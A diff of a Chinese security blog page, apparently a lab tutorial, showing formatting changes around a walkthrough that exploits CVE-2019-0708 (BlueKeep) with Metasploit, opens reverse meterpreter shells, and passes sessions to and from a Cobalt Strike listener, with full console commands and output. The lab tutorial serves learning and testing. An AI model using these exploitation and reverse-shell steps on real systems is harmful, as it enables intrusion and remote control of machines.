@@ -437,7 +437,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    1.6k
                 </div>
                 
 
@@ -458,6 +458,9 @@
         </div>
         <hr class="clearfix">
 
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
         
 
         
@@ -484,39 +487,46 @@
 <p>靶机 IP：192.168.175.177 （一台有 CVE-2019-0708 漏洞的 Win7 SP1 64 位靶机）</p>
 </blockquote>
 <h1 id="0x01-Metasploit-Framework-会话传递到-Cobalt-Strike"><a href="#0x01-Metasploit-Framework-会话传递到-Cobalt-Strike" class="headerlink" title="0x01 Metasploit Framework 会话传递到 Cobalt Strike"></a>0x01 Metasploit Framework 会话传递到 Cobalt Strike</h1><h2 id="1、Cobalt-Strike-上的操作"><a href="#1、Cobalt-Strike-上的操作" class="headerlink" title="1、Cobalt Strike 上的操作"></a>1、Cobalt Strike 上的操作</h2><p>首先来到 Cobalt Strike 目录下，启动 Cobalt Strike 服务端</p>
-<pre><code>./teamserver yourip yourpassword</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;teamserver yourip yourpassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>之后打开 Cobalt Strike 客户端进行连接</p>
-<pre><code>./start.sh</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;start.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>输入服务端密码连接上之后，点击 Cobalt Strike –&gt; Listeners 打开 Listeners 界面，点击下方的 Add 按钮，输入 Beacon 名称，这里选择的是 HTTPS Beacon，添加上主机 IP，点击保存，即可创建一个 HTTPS Beacon</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-24_20-07-57.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h2 id="2、Metasploit-Framework-上的操作"><a href="#2、Metasploit-Framework-上的操作" class="headerlink" title="2、Metasploit Framework 上的操作"></a>2、Metasploit Framework 上的操作</h2><p>首先，打开 Metasploit Framework</p>
-<pre><code>msfconsole </code></pre>
+<pre class="line-numbers language-none"><code class="language-none">msfconsole <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>调用 CVE-2019-0708 模块</p>
-<pre><code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>设置靶机 IP</p>
-<pre><code>set rhost 192.168.175.177</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">set rhost 192.168.175.177<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>设置 Payload</p>
-<pre><code>set payload windows/x64/meterpreter/reverse_tcp
-set lhost 192.168.175.200</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp
+set lhost 192.168.175.200<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>发起攻击</p>
-<pre><code>exploit</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">exploit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>整体过程如下：</p>
-<pre><code>root@kali:~# msfconsole
+<pre class="line-numbers language-none"><code class="language-none">root@kali:~# msfconsole
 
-msf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+msf5 &gt; use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce
 
-msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set rhost 192.168.175.177
-rhost =&gt; 192.168.175.177
+msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set rhost 192.168.175.177
+rhost &#x3D;&gt; 192.168.175.177
 
-msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set payload windows/x64/meterpreter/reverse_tcp
-payload =&gt; windows/x64/meterpreter/reverse_tcp
+msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp
+payload &#x3D;&gt; windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp
 
-msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set lhost 192.168.175.200
-lhost =&gt; 192.168.175.200
+msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set lhost 192.168.175.200
+lhost &#x3D;&gt; 192.168.175.200
 
-msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; exploit
+msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; exploit
 [*] Started reverse TCP handler on 192.168.175.200:4444 
-[*] 192.168.175.177:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
+[*] 192.168.175.177:3389 - Using auxiliary&#x2F;scanner&#x2F;rdp&#x2F;cve_2019_0708_bluekeep as check
 [+] 192.168.175.177:3389  - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
 [*] 192.168.175.177:3389  - Scanned 1 of 1 hosts (100% complete)
 [*] 192.168.175.177:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028608000, Channel count 1.
@@ -528,54 +538,64 @@ msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; exploit
 [*] Sending stage (206403 bytes) to 192.168.175.177
 [*] Meterpreter session 4 opened (192.168.175.200:4444 -&gt; 192.168.175.177:49167) at 2020-07-26 05:57:22 -0400
 
-meterpreter &gt; </code></pre>
+meterpreter &gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_17-57-47.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h2 id="3、开始传递会话"><a href="#3、开始传递会话" class="headerlink" title="3、开始传递会话"></a>3、开始传递会话</h2><p>首先，backgroud 会话</p>
-<pre><code>background</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">background<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>调用 payload_inject 模块</p>
-<pre><code>use exploit/windows/local/payload_inject</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>设置 HTTPS Payload</p>
-<pre><code>set payload windows/meterpreter/reverse_https</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">set payload windows&#x2F;meterpreter&#x2F;reverse_https<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>设置 lhost 和 lport 为 Cobalt Strike 的监听 IP 与端口</p>
-<pre><code>set lhost 192.168.175.200
-set lport 443</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">set lhost 192.168.175.200
+set lport 443<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>设置 DisablePayloadHandler 为 True，此选项会让 Metasploit Framework 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉 Metasploit Framework 说我们已经建立了监听器，不必再新建监听器了。</p>
-<pre><code>set DisablePayloadHandler True</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">set DisablePayloadHandler True<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>（可选）设置 PrependMigrate 为 True，此选项让 Metasploit Framework 前置 shellcode 在另一个进程中运行 payload stager，如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活。</p>
-<pre><code>set PrependMigrate True</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">set PrependMigrate True<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>设置要传递的会话 session，如果不知道自己的 session id，可以通过 sessions -l 查看，我这里待传递的 session id 为 4</p>
-<pre><code> set session 4</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">set session 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>开始会话传递</p>
-<pre><code>run</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>整体过程如下：</p>
-<pre><code>msf5 &gt; background 
+<pre class="line-numbers language-none"><code class="language-none">msf5 &gt; background 
 [*] Backgrounding session 4...
 
-msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; use exploit/windows/local/payload_inject
+msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject
 
-msf5 exploit(windows/local/payload_inject) &gt; set payload windows/meterpreter/reverse_https
-payload =&gt; windows/meterpreter/reverse_https
+msf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_https
+payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_https
 
-msf5 exploit(windows/local/payload_inject) &gt; set lhost 192.168.175.200
-lhost =&gt; 192.168.175.200
+msf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; set lhost 192.168.175.200
+lhost &#x3D;&gt; 192.168.175.200
 
-msf5 exploit(windows/local/payload_inject) &gt; set lport 443
-lport =&gt; 443
+msf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; set lport 443
+lport &#x3D;&gt; 443
 
-msf5 exploit(windows/local/payload_inject) &gt; set DisablePayloadHandler True
-DisablePayloadHandler =&gt; true
+msf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; set DisablePayloadHandler True
+DisablePayloadHandler &#x3D;&gt; true
 
-msf5 exploit(windows/local/payload_inject) &gt; set PrependMigrate True
-PrependMigrate =&gt; True
+msf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; set PrependMigrate True
+PrependMigrate &#x3D;&gt; True
 
-msf5 exploit(windows/local/payload_inject) &gt;  set session 4
-session =&gt; 4
+msf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt;  set session 4
+session &#x3D;&gt; 4
 
-msf5 exploit(windows/local/payload_inject) &gt; run
+msf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; run
 [*] Running module against WIN-T0UES7KBMJ5
 [*] Spawned Notepad process 544
 [*] Injecting payload into 544
-[*] Preparing &#39;windows/meterpreter/reverse_https&#39; for PID 544</code></pre>
+[*] Preparing &#39;windows&#x2F;meterpreter&#x2F;reverse_https&#39; for PID 544<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_19-11-30.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>此时，来到 Cobalt Strike 下已经可以看到传递过来的会话了</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-08-39.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
@@ -583,27 +603,31 @@ msf5 exploit(windows/local/payload_inject) &gt; run
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-27-02.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10">为了使 Cobalt Strike 获得一个会话，需要复制创建好的命令，并在靶机上运行，此时靶机便会上线了</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-30-31.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h2 id="2、Metasploit-Framework-上的操作-1"><a href="#2、Metasploit-Framework-上的操作-1" class="headerlink" title="2、Metasploit Framework 上的操作"></a>2、Metasploit Framework 上的操作</h2><p>首先，在 Metasploit Framework 上调用 handler 模块</p>
-<pre><code>use exploit/multi/handler</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>设置 HTTP Payload</p>
-<pre><code>set payload windows/meterpreter/reverse_http
+<pre class="line-numbers language-none"><code class="language-none">set payload windows&#x2F;meterpreter&#x2F;reverse_http
 set lhost 192.168.175.200
-set lport 4480</code></pre>
+set lport 4480<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>运行该模块</p>
-<pre><code>run</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>整体过程如下：</p>
-<pre><code>msf5 &gt; use exploit/multi/handler
+<pre class="line-numbers language-none"><code class="language-none">msf5 &gt; use exploit&#x2F;multi&#x2F;handler
 
-msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_http
-payload =&gt; windows/meterpreter/reverse_http
+msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_http
+payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_http
 
-msf5 exploit(multi/handler) &gt; set lhost 192.168.175.200
-lhost =&gt; 192.168.175.200
+msf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.175.200
+lhost &#x3D;&gt; 192.168.175.200
 
-msf5 exploit(multi/handler) &gt; set lport 4480
-lport =&gt; 4480
+msf5 exploit(multi&#x2F;handler) &gt; set lport 4480
+lport &#x3D;&gt; 4480
 
-msf5 exploit(multi/handler) &gt; run
-[*] Started HTTPS reverse handler on http://192.168.175.200:4480</code></pre>
+msf5 exploit(multi&#x2F;handler) &gt; run
+[*] Started HTTPS reverse handler on http:&#x2F;&#x2F;192.168.175.200:4480<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h2 id="3、开始会话传递"><a href="#3、开始会话传递" class="headerlink" title="3、开始会话传递"></a><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-35-45.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10">3、开始会话传递</h2><p>在 Cobalt Strike 上先创建一个  Foreign HTTP 监听，IP 和 端口设置成上面 Metasploit Framework 所设置 handler 模块的端口和 IP</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-39-58.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>之后在 Cobalt Strike 上右击待传递的会话选择 Spawn ，选择刚刚创建的 Foreign HTTP 监听</p>
@@ -1040,7 +1064,7 @@ msf5 exploit(multi/handler) &gt; run
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">162.6k</span>&nbsp;字
+                class="white-color">164k</span>&nbsp;字
             
             
             
